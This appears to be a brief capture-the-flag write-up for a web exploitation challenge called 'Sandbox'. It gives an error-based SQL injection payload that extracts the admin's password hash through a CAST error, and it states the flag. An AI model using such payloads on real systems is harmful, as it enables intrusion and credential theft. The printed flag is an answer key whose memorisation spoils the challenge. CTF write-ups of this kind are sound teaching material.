# Challenge Details
Challenge Name: Sandbox  
Category: Web Exploitation  
Author: Iscara  

# Challenge Description
Web

http://challs.nusgreyhats.org:30080

# Solve
This payload allows us to exploit the vulnerable structure of the form input.  
`' AND 1=CAST((SELECT password_hash FROM users WHERE username='admin') AS INTEGER)--`  
The flag is also in the DB provided when downloading the challenge WebApp  

# Flag
grey{this_is_a_database_secret}
